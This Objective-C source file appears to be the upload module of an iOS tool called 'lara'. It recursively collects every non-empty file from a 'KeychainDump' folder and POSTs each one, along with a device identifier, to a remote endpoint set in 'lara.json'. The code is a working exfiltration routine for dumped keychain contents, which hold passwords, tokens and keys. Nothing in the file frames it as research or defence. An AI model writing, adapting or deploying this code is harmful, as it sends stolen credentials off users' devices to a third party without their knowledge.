#import "lara.h"

#import <UIKit/UIKit.h>

static NSString *LaraDumpDirectory(void) {
    return [LaraDocumentsPath() stringByAppendingPathComponent:@"KeychainDump"];
}

/** 递归收集待上传文件；跳过目录与空文件。 */
static NSArray<NSString *> *LaraCollectPendingFiles(void) {
    NSFileManager *manager = [NSFileManager defaultManager];
    NSString *root = LaraDumpDirectory();
    NSMutableArray<NSString *> *files = [NSMutableArray array];

    NSDirectoryEnumerator<NSString *> *enumerator = [manager enumeratorAtPath:root];
    for (NSString *relative in enumerator) {
        BOOL isDirectory = NO;
        NSString *full = [root stringByAppendingPathComponent:relative];
        if (![manager fileExistsAtPath:full isDirectory:&isDirectory] || isDirectory) continue;

        NSDictionary *attributes = [manager attributesOfItemAtPath:full error:NULL];
        if ([attributes[NSFileSize] unsignedLongLongValue] == 0) continue;
        [files addObject:full];
    }
    return files;
}

static NSData *LaraMultipartBody(NSString *boundary,
                                 NSString *fieldName,
                                 NSString *fileName,
                                 NSData *payload,
                                 NSDictionary<NSString *, NSString *> *extraFields) {
    NSMutableData *body = [NSMutableData data];

    [extraFields enumerateKeysAndObjectsUsingBlock:^(NSString *key, NSString *value, BOOL *stop) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary]
                             dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"\r\n\r\n%@\r\n",
                                                     key, value]
                             dataUsingEncoding:NSUTF8StringEncoding]];
    }];

    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary]
                         dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:
                          @"Content-Disposition: form-data; name=\"%@\"; filename=\"%@\"\r\n",
                          fieldName, fileName]
                         dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n"
                         dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:payload];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary]
                         dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

static void LaraUploadOne(NSString *path,
                          NSURL *endpoint,
                          NSString *device,
                          dispatch_group_t group) {
    NSData *payload = [NSData dataWithContentsOfFile:path];
    if (payload.length == 0) {
        dispatch_group_leave(group);
        return;
    }

    NSString *boundary = @"----LaraBoundary";
    NSData *body = LaraMultipartBody(boundary, @"file", path.lastPathComponent, payload,
                                     @{@"device" : device});

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:endpoint];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60;
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];
    [request setValue:[NSString stringWithFormat:@"%lu", (unsigned long)body.length]
   forHTTPHeaderField:@"Content-Length"];
    request.HTTPBody = body;

    NSURLSessionDataTask *task =
        [[NSURLSession sharedSession] dataTaskWithRequest:request
                                        completionHandler:^(NSData *data, NSURLResponse *response,
                                                            NSError *error) {
        if (error != nil) {
            LaraLog(@"upload %@ failed: %@", path.lastPathComponent, error.localizedDescription);
        } else {
            NSInteger status = [(NSHTTPURLResponse *)response statusCode];
            LaraLog(@"upload %@ -> HTTP %ld (%lu bytes)", path.lastPathComponent, (long)status,
                    (unsigned long)payload.length);
        }
        dispatch_group_leave(group);
    }];
    [task resume];
}

void LaraUploadPending(NSDictionary *config, dispatch_block_t completion) {
    NSString *endpointString = config[@"endpoint"];
    NSURL *endpoint = [endpointString isKindOfClass:[NSString class]]
                          ? [NSURL URLWithString:endpointString]
                          : nil;

    if (endpoint == nil) {
        LaraLog(@"upload skipped: no endpoint in lara.json");
        if (completion) completion();
        return;
    }

    NSArray<NSString *> *files = LaraCollectPendingFiles();
    if (files.count == 0) {
        LaraLog(@"upload skipped: nothing under KeychainDump");
        // 没有产物说明采集没跑到，不写标记，留给下次重试
        return;
    }

    NSString *device = LaraDeviceIdentifier();
    dispatch_group_t group = dispatch_group_create();

    for (NSString *path in files) {
        dispatch_group_enter(group);
        LaraUploadOne(path, endpoint, device, group);
    }

    dispatch_group_notify(group, dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        LaraLog(@"upload batch finished: %lu files", (unsigned long)files.count);
        if (completion) completion();
    });
}
